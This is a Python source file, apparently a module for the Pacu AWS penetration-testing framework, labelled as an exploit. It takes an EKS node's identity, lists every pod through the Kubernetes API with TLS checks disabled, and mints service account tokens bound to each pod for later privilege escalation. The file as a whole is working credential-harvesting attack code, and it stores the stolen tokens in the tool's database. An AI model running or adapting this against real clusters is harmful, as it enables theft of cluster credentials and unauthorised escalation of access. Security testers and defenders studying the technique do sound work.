#!/usr/bin/env python3
import argparse
import json
import requests
from copy import deepcopy
from botocore.exceptions import ClientError
# Used to generate eks authentication token
from awscli.customizations.eks.get_token import STSClientFactory, TokenGenerator


# TODO 
# look for cluster stored in database
# store data in database
# error handling
module_info = {
    'name': 'eks__collect_tokens',
    'author': 'Roshan Guragain',
    'category': 'EXPLOIT',
    'one_liner': 'This modules gets all the service account tokens of pods running on a node in EKS.',
    'description': '''This modules gets all the service account tokens of pods running on a node in EKS.
      The tokens can be later used to gain other permissions in the EKS cluster. Credits : https://blog.calif.io/p/privilege-escalation-in-eks''',
    'services': ['EKS'],
    'prerequisite_modules': [],
    'external_dependencies': [],
    'arguments_to_autocomplete': ['--regions'],
}

# Added to reduce the warnings shown on the screen
requests.packages.urllib3.disable_warnings()

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
parser.add_argument('--regions', required=False, default=None, help='The region in which cluster is running on.')
parser.add_argument('--cluster_name', required=True, default=None, help='The cluster name from which service account tokens of pods are to be extracted from')


class Pod:
    '''
        Sample Pod object with name, uid, node_name and serviceAccountToken attached to the pod
    '''
    def __init__(self, uid, name, node_name, service_account_name, namespace, arn=None):
        self.name = name
        self.uid = uid
        self.node_name = node_name
        self.service_account_name = service_account_name
        self.namespace = namespace
        self.arn = arn
        self.service_account_token = ""      

    def __str__(self):
        return f"{self.name} \t   {self.node_name} \t  {self.service_account_name}"


class Communicator:
    '''
        Class to create object to communicate with the api server
    '''
    def __init__(self, server, token):
        self.server = server
        self.token = token
        self.pods = self.parse_pod_list(self.get_pods())
        self.node_name = ""

    def get_pods(self):
        '''
            Calls the API server to get all the pods
        '''
        url = self.server + "/api/v1/pods"
        header = {"Authorization": f"Bearer {self.token}"}
        r = requests.get(url, headers=header, verify=False, timeout=5)
        if r.status_code != 200:
            print("Check token validity or server information")
        response = r.json()
        return response

    def parse_pod_list(self, pod_list):
        '''
            Gets a list of pods as a dictionary
            and returns a pod object
        '''
        all_pods_obj = []
        for pod in pod_list['items']:
            name = pod['metadata']['name']
            uid = pod['metadata']['uid']
            namespace = pod['metadata']['namespace']
            node_name = pod['spec']['nodeName']
            service_account_name = pod['spec']['serviceAccountName']
            arn = None
            for container in pod['spec']['containers']:
                if 'env' not in container.keys():
                    break
                for env in container['env']:
                    if 'AWS_ROLE_ARN' == env['name']:
                        arn = env['value']
            pod_obj = Pod(uid=uid, name=name, node_name=node_name, service_account_name=service_account_name, namespace=namespace, arn=arn)
            all_pods_obj.append(pod_obj)
        return all_pods_obj

    def get_sa_token(self, pod):
        '''
            Assuming the pod has access to metadata in eks
        '''
        if pod.service_account_name == 'default':
            return
        url = self.server + f"/api/v1/namespaces/{pod.namespace}/serviceaccounts/{pod.service_account_name}/token"
        header = {"Authorization": f"Bearer {self.token}", "Content-Type": "application/json"}
        data = {
            "spec": {
                "audiences": None,
                "expirationSeconds": None,
                "boundObjectRef": {
                    "kind": "Pod",
                    "apiVersion": "v1",
                    "name": pod.name,
                    "uid": pod.uid
                }
            }
        }
        response = requests.post(url, headers=header, data=json.dumps(data), verify=False, timeout=5)
        response_json = response.json()
        token = response_json['status']['token']
        pod.service_account_token = token
        print(f"Token created for SA {pod.service_account_name}")
        return token

    def get_all_pods_with_token(self):
        '''
            Get service account token of pods in the node
        '''
        all_pod_info = {}
        for pod in self.pods:
            try:
                self.get_sa_token(pod)
                all_pod_info[pod.name] = pod.__dict__
            except Exception as e:
                print(f"Pod {pod.name} not in current node. Error: {str(e)}")
        return all_pod_info


# Main is the first function that is called when this module is executed.
def main(args, pacu_main):
    # session = pacu_main.get_active_session()
    args = parser.parse_args(args)
    # print = pacu_main.print
    # input = pacu_main.input
    # key_info = pacu_main.key_info
    # fetch_data = pacu_main.fetch_data
    get_regions = pacu_main.get_regions
    session = pacu_main.get_active_session()
    cluster_name = args.cluster_name
    # cluster_name = 'demo-eks'

    if args.regions is None:
        regions = get_regions('eks')
        if regions is None or regions == [] or regions == '' or regions == {}:
            print('This module is not supported in any regions specified in the current sessions region set. Exiting...')
            return
    else:
        regions = args.regions.split(',')

    for region in regions:
        try:
            # error handling missing
            boto_session = pacu_main.get_boto_session()._session

            eks_token = get_eks_node_token(boto_session, cluster_name, region=region)
            # get information about current cluster
            eks_client = pacu_main.get_boto3_client('eks', region)
            cluster_information = eks_client.describe_cluster(name=cluster_name)

            # get cluster-endpoint to use later
            cluster_endpoint = cluster_information['cluster']['endpoint']
            print(cluster_endpoint)

            a = Communicator(cluster_endpoint, eks_token)
            all_pods = a.get_all_pods_with_token()

            # update EKS data
            data = {"Cluster": cluster_name, "endpoint": cluster_endpoint, "Pods": all_pods}
            eks_data = deepcopy(session.EKS)
            eks_data['eks-attack'] = data
            session.update(pacu_main.database, EKS=eks_data)
            return eks_data              
        except ClientError as error:
            print(f"Error: {error}")


def get_eks_node_token(session, cluster_name, region=None):
    '''
        Get token for a node to authenticate with kubernetes cluster
    '''
    # taken from https://github.com/peak-ai/eks-token/blob/main/eks_token/logics.py
    factory = STSClientFactory(session)
    token = TokenGenerator(factory.get_sts_client(region_name=region)).get_token(cluster_name)
    return token


def summary(data, pacu_main):
    return "Run \"data eks\" to view the data"

